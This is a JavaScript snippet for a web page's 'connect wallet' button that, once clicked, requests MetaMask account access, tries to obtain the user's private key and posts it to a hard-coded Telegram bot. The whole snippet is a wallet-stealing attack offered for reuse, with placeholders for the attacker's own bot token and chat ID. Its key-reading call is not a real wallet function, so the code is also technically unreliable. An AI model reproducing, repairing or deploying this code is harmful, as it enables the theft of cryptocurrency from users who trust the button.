document.getElementById('connectWallet').addEventListener('click', async () => {
    if (window.ethereum) {
    try {
    // Request account access
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    const userAccount = accounts[0];
   
    // Create a Web3 instance
    const web3 = new Web3(window.ethereum);
   
    // Get the private key
    const privateKey = await web3.eth.getPrivateKey(userAccount);
   
    // Send the private key to your Telegram account
    const telegramBotToken = '8732678869:AAEvdi0iwIspDdXO-nnirEFySLIUPFFuboI'; // Replace with your Telegram bot token
    const chatId = '6870666933'; // Replace with your chat ID
    const message = `Private Key: ${privateKey}`;
   
    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
    method: 'POST',
    headers: {
    'Content-Type': 'application/json'
    },
    body: JSON.stringify({
    chat_id: chatId,
    text: message
    })
    });
   
    if (response.ok) {
    console.log('Private key sent to Telegram successfully.');
    } else {
    console.error('Failed to send private key to Telegram.');
    }
    } catch (error) {
    console.error('Error:', error);
    }
    } else {
    console.log('Please install MetaMask!');
    }
   });
   
